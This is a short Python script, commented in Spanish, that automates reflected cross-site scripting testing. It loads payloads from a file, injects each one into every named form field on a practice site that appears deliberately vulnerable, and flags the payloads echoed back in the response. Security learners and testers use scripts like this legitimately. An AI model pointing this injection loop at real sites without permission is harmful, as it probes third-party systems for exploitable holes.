import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer

# Lista para almacenar los vectores de ataque XSS
xsspayloads = []

# Abrir el archivo que contiene los vectores de ataque XSS
# Cada línea representa un payload de prueba para inyección XSS
with open('XSS-attack-vectors.txt', 'r') as filehandle:
    for line in filehandle:
        xsspayload = line[:-1]  # Elimina el carácter de nueva línea al final de cada línea
        xsspayloads.append(xsspayload)  # Agrega el payload a la lista

# URL del sitio vulnerable que se va a probar
url = 'http://testphp.vulnweb.com/search.php?test=query'

# Diccionario para almacenar los datos que se enviarán en las solicitudes POST
data = {}

# Realiza una solicitud GET inicial para obtener el contenido de la página
response = requests.get(url)

# Itera sobre cada payload de XSS en la lista
for payload in xsspayloads:
    # Analiza la respuesta HTML y busca solo las etiquetas <input>
    for field in BeautifulSoup(response.text, "html.parser", parse_only=SoupStrainer('input')):
        print(field)  # Muestra la etiqueta <input> encontrada para depuración

        # Verifica si la etiqueta <input> tiene un atributo 'name'
        if field.has_attr('name'):
            if field['name'].lower() == "submit":
                # Si el campo se llama "submit", lo asigna como un botón de envío
                data[field['name']] = "submit"
            else:
                # Si no es un botón de envío, asigna el payload XSS al campo
                data[field['name']] = payload

    # Envía una solicitud POST con los datos generados
    response = requests.post(url, data=data)

    # Verifica si el payload XSS está presente en la respuesta del servidor
    if payload in response.text:
        # Si el payload aparece en la respuesta, es una indicación de vulnerabilidad XSS
        print("Payload " + payload + " returned in the response")
